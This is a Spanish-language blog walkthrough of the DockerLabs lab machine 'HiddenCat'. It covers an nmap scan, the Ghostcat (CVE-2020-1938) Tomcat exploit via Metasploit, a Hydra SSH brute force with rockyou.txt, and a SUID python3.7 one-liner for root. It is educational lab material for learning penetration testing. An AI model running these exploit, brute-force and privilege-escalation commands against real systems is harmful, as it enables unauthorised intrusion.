---
layout: post
title: Maquina HiddenCat
subtitle: DockerLabs
header-img: img/in-post/2020-10-07/upload-dl.png
header-style: text
catalog: true
tags:
  -  DockerLabs
  -  Fuerza Bruta
  -  Binarios UNIX
  -  Metasploit
  -  Reverse Shell
---

#### **Información**
- **Máquina:** HiddenCat
- **Plataforma:** [DockerLabs](https://dockerlabs.es/)
- **Creador:** El Pingüino de Mario
- **SO:** Linux
- **Dificultad:** `Facil`{:.success}

#### **Configuración Entorno**
Primeramente, como siempre para configurar las máquinas de DockerLabs, exportamos los ficheros auto_deploy.sh y en este caso hiddencat.tar.
Para ejecutarlo utilizamos el siguiente comando:
```bash
sudo bash auto_deploy.sh hiddencat.tar
```
![Image 1](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img1.png)

**auto_deploy.sh:** este archivo se encarga de desplegar la máquina mediante docker y, una vez presionamos `ctrl+c`{:.info} pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.

**hiddencat.tar:** contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.

#### **Reconocimiento**
Lo primero que realizamos es lanzar un ping contra la IP de la máquina para comprobar que tenemos conectividad.
```bash
ping -c 1 172.17.0.2
```
![Image 2](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img2.png)

Podemos observar que el ttl es de 64, por tanto, como norma general podemos afirmas que se trata de una maquina linux.
Una vez comprobada la conectividad, iniciaremos un escaneo con nmap, para detectar puertos abiertos y lo almacenaremos en un fichero llamado scan, con el siguiente comando:
```bash
nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn -oN scan
```
- **-p-** --> Busqueda de puertos abiertos
- **--open** --> Enumera los puertos abiertos
- **-sS** --> Es un modo de escaneo rápido
- **-sC** --> Que use un conjunto de scripts de reconocimiento
- **-sV** --> Que encuentre la versión del servicio abierto
- **--min-rate=5000** --> Hace que el reconocimiento aun vaya más rápido mandando no menos de 5000 paquetes
- **-n** --> No hace resolución DNS
- **-Pn** --> No hace ping
- **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)
![Image 3](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img3.png)
![Image 4](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img4.png)

Vemos que tiene abiertos los puertos **22 (SSH), 8080 y 8009**.
Gracias a los scrips de nmap nos detecta lo siguiente:
-	Puerto 22: `OpenSSH 7.9p1`{:.error}
-	Puerto 8009: `Apache Jserv (Protocol v1.3)`{:.error}
-	Puerto 8080: `Apache Tomcat 9.0.30`{:.error}

#### **Explotación**
Descartamos de momento atacar al puerto 22 ya que cuenta con una versión de OpenSSH no vulnerable, por tanto, investigamos el puerto 8009 que corre un Apache Jserv. Encontramos la siguiente referencia al respecto en [HackTriks](https://book.hacktricks.xyz/v/es/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp), donde se detalla que versiones anteriores a 9.0.31, 8.5.51 y 7.0.100 de Apache Tomcat, si el puerto AJP está expuesto -como es el caso aquí, dado que tenemos la versión 9.0.30 y el puerto 8009 expuesto-, presentan una vulnerabilidad conocida como `Ghostcat`{:.info} (CVE-2020-1938).

En el propio HackTik encontramos un script en Python que permite explotar esta vulnerabilidad, yo he preferido buscarlo en `Metasploit`{:.info}.

Arrancamos Metasploit con el comando `msfconsole`{:.info}.
Una vez dentro buscamos los exploits que hagan referencia a Apache Jserv
```bash
msf6 > search exploit Apache Jserv
```
Encontramos el exploit `tomcat_ghostcat`{:.info}, lo seleccionamos.
```bash
msf6 > use 0
```
Y revisamos los parámetros necesarios para el exploit.
```bash
msf6 > show options
```
![Image 5](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img5.png)

Establecemos la IP de la maquina víctima y ejecutamos el exploit.
```bash
msf6> set RHOST 172.17.0.2
msf6> exploit
```
![Image 6](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img6.png)

Podemos ver que tenemos un usuario llamado Jerry.
Teniendo el usuario podríamos tratar de aplicar fuerza bruta para lograr acceso por SSH a la maquina víctima, ya que como nos mostró el escaneo de nmap, contamos con el Puerto 22 abierto.
Realizamos el ataque con Hydra al usuario Jerry utilizando el diccionario de contraseñas comunes `rockyou.txt`{:.info}.
```bash
hydra 172.17.0.2 ssh -s 22 -l jerry -P /usr/share/wordlists/rockyou.txt -f -I -t 64
```
![Image 7](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img7.png)

Y efectivamente nos encuentra la contraseña `chocolate`{:.success} :chocolate_bar: para el usuario Jerry
Accedemos por SSH a la maquina víctima.

![Image 8](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img8.png)
Una vez dentro trato de ejecutar sudo -l para listar los privilegios que tiene el usuario “Jerry” en el sistema mediante el comando sudo. Esto significa que muestra qué comandos puede ejecutar el usuario Jerry con privilegios elevados utilizando sudo, así como cualquier restricción aplicada a esos privilegios.
Pero nos indica que sudo no está instalado en el sistema, por tanto, pruebo a buscar los archivos con permisos SUID en el sistema.
```bash
jerry@a8385f5ecbd3:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/su
/bin/umount
/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/perl5.28.1
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/perl
/usr/bin/chsh
/usr/bin/python3.7
/usr/bin/python3.7m
```
Consultamos [http://https://gtfobins.github.io/](http://https://gtfobins.github.io/) para encontrar una manera de elevar privilegios con Python. Luego, ejecutamos el siguiente comando:
```bash
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![Image 9](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img9.png)

Y efectivamente, ya somo `root`{:.error}, por lo tanto, `¡¡¡maquina vulnerada!!!`{:.success} :sunglasses::sunglasses::sunglasses:

#### **Eliminación del entorno**

Para borrar la máquina solo debemos ir a la consola donde lo desplegamos y presionar `ctrl+c`{:.info} y eliminaría y borraría todo rastro de la máquina víctima en nuestro sistema LINUX.

![Image 10](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img10.png)

`¡¡¡Espero que os haya gustado y nos vemos en la próxima!!!`{:.success}
